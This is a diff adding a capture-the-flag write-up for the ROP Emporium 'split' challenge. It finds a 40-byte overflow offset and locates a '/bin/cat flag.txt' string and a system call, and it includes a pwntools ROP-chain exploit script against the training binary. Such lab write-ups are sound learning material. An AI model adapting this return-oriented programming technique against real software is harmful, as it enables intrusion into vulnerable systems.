@@ -64,3 +64,55 @@ And we receive the flag!
 
 ![image](https://github.com/user-attachments/assets/bdf77cb5-82dd-44ae-8cd9-08b351c8c06a)
 
+
+## split
+You can download the binary here: https://ropemporium.com/binary/split.zip
+
+We start executing the binary:
+
+![image](https://github.com/user-attachments/assets/a91d55a6-a381-483b-ae2d-036124fd4197)
+
+In this case, we don't receive information about the buffer size. We are going to send a large buffer of 200 bytes and see the registers:
+
+![image](https://github.com/user-attachments/assets/f19d7d7e-1f63-4f57-abe0-346af7c7f3e0)
+
+With 32 bytes we overwrite the RBP so we need to send 40 bytes of data. We begin searching interesting strings at the data section:
+
+![image](https://github.com/user-attachments/assets/420fa4fe-c02f-4429-ba0e-a232c66d4c06)
+
+![image](https://github.com/user-attachments/assets/95e7c82f-b086-4faf-9645-c860d9d1b4a4)
+
+We see the "/bin/cat flag.txt" string. Looking at the imported functions we don't see a ret2win function but we still have the vulnerable "pwnme" function and the string that prints the flag. We find the function "usefulFunction", that contains a call to system:
+
+![image](https://github.com/user-attachments/assets/343b041b-babf-4780-aa46-8a9d050ea73b)
+
+![image](https://github.com/user-attachments/assets/603269a5-0d5e-4548-b5de-ec24361cb451)
+
+We create an exploit, exploiting the vulnerable function "pwnme", and calling the system function of usefulFunction with the argument of the data section. Before that, we need a pop gadget for the rop chain:
+
+![image](https://github.com/user-attachments/assets/67ee559f-e9b2-4c13-9769-5cc65e4f2bea)
+
+And we craft the exploit:
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./split')
+
+p = process(elf.path)
+
+offset = 40
+filler = b"A" * offset
+pop_rdi = p64(0x004007c3)
+system = p64(0x000000000040074b)
+bin_cat = p64(0x601060)
+payload = filler + pop_rdi + bin_cat + system
+
+p.sendline(payload)
+
+p.interactive()
+```
+And we receive the flag:
+
+![image](https://github.com/user-attachments/assets/bf2efb9a-4929-4828-8882-c93b7f6ea97c)
+
